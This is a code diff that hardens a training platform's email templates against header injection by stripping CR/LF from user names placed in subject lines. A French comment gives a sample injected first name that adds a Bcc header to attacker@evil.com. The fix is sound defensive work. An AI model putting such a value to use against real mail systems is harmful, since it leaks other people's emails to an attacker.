@@ -41,6 +41,19 @@ function esc(v: unknown): string {
     .replace(/'/g, '&#39;');
 }
 
+// SHERLOCK R14 — H7 : strip CR/LF des valeurs interpolées dans les
+// `subject:` des templates. Un user qui s'inscrit avec
+// first_name = "Toto\r\nBcc: attacker@evil.com" peut injecter un
+// nouveau header RFC822 dans le subject — Resend (et certains MTAs en
+// aval) honorent le Bcc → l'email étudiant suivant est envoyé en copie
+// à l'attaquant. send-email/index.ts checke déjà les CRLF sur 'custom',
+// mais les templates auto (welcome/reminder/etc.) bypassaient ce check
+// puisque le subject est constuit serveur. Ce strip est défense en
+// profondeur : on neutralise les CRLF AVANT que ça atteigne Resend.
+function stripCrlf(s: unknown): string {
+  return String(s ?? '').replace(/[\r\n]+/g, ' ').trim();
+}
+
 function shell(content: string, vars: TemplateVars = {}): string {
   // SHERLOCK R3 / GDPR : `unsubscribe_url` est passé par check-inactive-users
   // (et tout futur sender d'emails marketing) avec un token unique par user.
@@ -119,7 +132,8 @@ export function reminderInactiveEmail(vars: TemplateVars): { subject: string; ht
   const lessonText = vars.next_lesson_number
     ? `<strong>leçon ${esc(vars.next_lesson_number)}${vars.next_lesson_title ? ` — « ${esc(vars.next_lesson_title)} »` : ''}</strong>`
     : 'tes leçons';
-  const subject = `${name}, où en es-tu dans ta formation Pflege ?`;
+  // SHERLOCK R14 — H7 : stripCrlf sur `name` (= vars.first_name, user input).
+  const subject = `${stripCrlf(name)}, où en es-tu dans ta formation Pflege ?`;
   const html = shell(`
     <h1 style="margin:0 0 12px;font-size:22px;color:${INK};">Bonjour ${esc(name)},</h1>
     <p>Ça fait <strong>une semaine</strong> qu'on ne t'a pas vu sur la plateforme. Tu en es à <strong>${esc(vars.percentage_complete ?? 0)}%</strong> de ta formation.</p>
@@ -181,7 +195,8 @@ export function certificateIssuedEmail(vars: TemplateVars): { subject: string; h
 export function feedbackRequestEmail(vars: TemplateVars): { subject: string; html: string; text: string } {
   const name = vars.first_name ?? 'à toi';
   const url  = vars.app_url ?? APP_URL_DEFAULT;
-  const subject = `Une dernière chose ${name} avant de partir conquérir l'Allemagne 🇩🇪`;
+  // SHERLOCK R14 — H7 : stripCrlf sur `name` (interpolated user input).
+  const subject = `Une dernière chose ${stripCrlf(name)} avant de partir conquérir l'Allemagne 🇩🇪`;
   const html = shell(`
     <h1 style="margin:0 0 12px;font-size:22px;color:${INK};">Une faveur, ${esc(name)} ?</h1>
     <p>Tu as terminé la formation. Si tu as 2 minutes, ton retour est précieux pour deux raisons :</p>
